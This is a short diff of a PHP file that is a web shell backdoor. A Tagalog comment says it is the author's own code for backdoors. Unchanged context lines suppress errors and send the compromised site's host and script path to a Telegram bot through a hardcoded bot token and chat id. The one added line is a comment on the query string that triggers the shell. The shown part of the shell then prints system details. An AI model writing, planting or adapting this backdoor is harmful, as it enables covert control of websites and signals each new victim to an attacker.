@@ -4,7 +4,7 @@ error_log(0);
 file_get_contents("https://api.telegram.org/bot5202228547:AAHRkzQNW1feHYhwmhZrAdHGnYHmmLXcE_8/sendMessage?chat_id=-635799224&text=" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME']);
 
 // ang source code na ito pwede mo palitan ng kahit anong shell. kahit ano pero kasi ito personal kong gamit sa mga backdoors ko
-
+// to run ?start&&action=start
    if (!empty($_GET['action']) && $_GET['action'] == "start") {
       echo '<b>Uname: </b>' . php_uname() . '<br>';
       echo '<b>Path:</b> ';
